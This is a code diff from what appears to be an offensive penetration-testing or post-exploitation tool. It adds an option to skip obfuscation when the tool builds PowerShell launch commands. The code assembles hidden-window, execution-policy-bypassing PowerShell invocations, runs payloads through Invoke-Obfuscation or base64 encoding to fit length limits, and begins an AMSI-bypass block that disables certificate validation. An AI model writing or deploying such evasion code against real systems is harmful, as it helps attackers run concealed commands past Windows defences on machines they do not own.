@@ -67,7 +67,7 @@ def obfs_ps_script(path_to_script):
 
             return strippedCode
 
-def create_ps_command(ps_command, force_ps32=False):
+def create_ps_command(ps_command, force_ps32=False, dont_obfs=False):
 
     amsi_bypass = """[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
 try{
@@ -133,17 +133,23 @@ else
     
     else:
     """
-    obfs_attempts = 0
-    while True:
-        command = 'powershell.exe -exec bypass -noni -nop -w 1 -C "' + invoke_obfuscation(command) + '"'
-        if len(command) <= 8191: 
-            break
+    if not dont_obfs:
+        obfs_attempts = 0
+        while True:
+            command = 'powershell.exe -exec bypass -noni -nop -w 1 -C "' + invoke_obfuscation(command) + '"'
+            if len(command) <= 8191: 
+                break
 
-        if obfs_attempts == 4:
+            if obfs_attempts == 4:
+                logger.error('Command exceeds maximum length of 8191 chars (was {}). exiting.'.format(len(command)))
+                exit(1)
+
+            obfs_attempts += 1
+    else:
+        command = 'powershell.exe -noni -nop -w 1 -enc {}'.format(encode_ps_command(command))
+        if len(command) > 8191:
             logger.error('Command exceeds maximum length of 8191 chars (was {}). exiting.'.format(len(command)))
             exit(1)
-
-        obfs_attempts += 1
 
     return command
 
